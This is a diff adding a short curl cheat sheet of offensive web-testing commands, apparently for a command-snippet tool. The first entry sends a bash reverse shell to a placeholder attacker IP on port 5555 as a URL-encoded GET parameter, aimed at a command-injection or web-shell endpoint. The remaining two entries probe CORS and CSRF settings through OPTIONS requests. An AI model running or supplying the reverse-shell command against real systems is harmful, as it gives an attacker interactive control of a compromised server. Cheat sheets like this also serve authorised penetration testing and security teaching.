@@ -1,0 +1,10 @@
+% http, web, curl
+
+# revshell as data-urlencode get parameter
+curl -s -G <urlrevshell> --data-urlencode '0=bash -c "bash -i >& /dev/tcp/<attackip>/5555 0>&1"'
+
+# check if any custom headers are allowed in cross-site requests (CSRF)
+curl -X OPTIONS -v <URL> 2>&1 | grep Allow-Headers
+
+# check for allowed origins (CORS)
+curl -X OPTIONS -v -H "Origin: <URL_ORIGIN>" <URL> 2>&1 | grep Access-Control-Allow-Origin
